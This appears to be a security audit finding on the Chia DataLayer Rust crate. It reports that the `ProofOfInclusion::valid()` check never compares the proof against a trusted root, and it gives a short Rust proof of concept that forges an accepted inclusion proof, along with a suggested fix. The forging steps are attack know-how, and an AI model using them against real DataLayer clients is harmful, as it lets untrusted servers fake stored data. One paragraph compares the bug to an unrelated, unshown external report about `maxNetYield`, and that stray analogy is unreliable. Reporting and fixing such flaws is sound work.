### Title
`ProofOfInclusion::valid()` Tautological Final Check Allows Forged DataLayer Inclusion Proofs - (File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs)

### Summary

`ProofOfInclusion::valid()` contains a tautological final check that makes the function verify only internal self-consistency of the proof, not that the proof's root matches any externally trusted root hash. An attacker who can supply a crafted `ProofOfInclusion` (via deserialization from untrusted bytes) can forge a proof for any key/value pair and have `valid()` return `true`.

### Finding Description

The `valid()` method in `ProofOfInclusion` is the sole verification primitive exposed to callers (Rust and Python/wasm):

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← set to layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← always true
}
``` [1](#0-0) 

The final comparison `existing_hash == self.root_hash()` is tautological:

- After the loop body passes, `existing_hash` is set to `calculated_hash`, which was just verified to equal `layer.combined_hash`.
- `root_hash()` returns `last.combined_hash` — the same field. [2](#0-1) 

So the final line reduces to `last.combined_hash == last.combined_hash`, which is unconditionally `true` whenever the loop completes. The function never compares the computed root against any externally supplied trusted root hash.

The analog to the external report's root cause is direct: the external contract used `maxNetYield` — an optimistic value derived from the proof's own parameters — as the divisor instead of an external ground truth. Here, `valid()` uses `self.root_hash()` — a value derived entirely from the proof's own fields — as the trusted root instead of an externally provided on-chain root.

`ProofOfInclusion` is `Streamable` and exposes `from_bytes` / `from_bytes_unchecked` in both Rust and Python: [3](#0-2) [4](#0-3) 

This means any code path that deserializes a `ProofOfInclusion` from untrusted network bytes and calls `valid()` — without separately comparing `proof.root_hash()` to a trusted on-chain root — will accept a completely fabricated proof.

### Impact Explanation

An attacker controlling a DataLayer server (or a man-in-the-middle) can:

1. Construct a `ProofOfInclusion` with arbitrary `node_hash = H0`, `other_hash = H1`, `other_hash_side = Right`, and `combined_hash = calculate_internal_hash(H0, Right, H1)` (a single correctly-chained layer).
2. Serialize it via `to_bytes()` and send it to a DataLayer client.
3. The client calls `proof.valid()` → returns `true`.
4. The client incorrectly believes key `K` is present in the tree with root `combined_hash`, even though no such tree exists.

This allows an untrusted DataLayer server to prove inclusion of any key/value pair in any fabricated root, enabling forged state proofs. This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."**

### Likelihood Explanation

The Python API exposes `valid()` as the only single-call verification method. There is no `valid_against_root(root: bytes32)` method. The natural usage pattern — `assert proof.valid()` — is exactly the vulnerable pattern. The fuzz target and all tests use proofs generated from the blob itself (so they never catch this), and no test verifies that a fabricated proof is rejected by `valid()`. [5](#0-4) 

Any DataLayer client that receives proofs over the network and relies solely on `valid()` is exploitable by a malicious or compromised DataLayer server.

### Recommendation

Replace the tautological final check with a comparison against a caller-supplied trusted root:

```rust
pub fn valid(&self) -> bool {
    // internal chain check only — does NOT verify against any trusted root
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    true
}

pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    self.valid() && self.root_hash() == *trusted_root
}
```

Expose `valid_against_root` (taking the on-chain committed root) as the primary verification API in both Rust and Python bindings, and deprecate or remove the standalone `valid()` from the public API surface to prevent misuse.

### Proof of Concept

```rust
use chia_datalayer::{Hash, KeyId, Side, ValueId};
use chia_datalayer::merkle::blob::calculate_internal_hash;
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};

fn forge_proof() {
    // Completely fabricated hashes — not in any real tree
    let fake_node_hash = Hash([0x11; 32]);
    let fake_sibling   = Hash([0x22; 32]);
    let fake_combined  = calculate_internal_hash(&fake_node_hash, Side::Right, &fake_sibling);

    let forged = ProofOfInclusion {
        node_hash: fake_node_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Right,
            other_hash: fake_sibling,
            combined_hash: fake_combined,
        }],
    };

    // valid() returns true for a completely fabricated proof
    assert!(forged.valid(), "forged proof accepted — tautological final check");
    // root_hash() is fake_combined, not any real on-chain root
}
```

The proof passes `valid()` despite not corresponding to any real `MerkleBlob` state, because the final check `existing_hash == self.root_hash()` reduces to `fake_combined == fake_combined`.
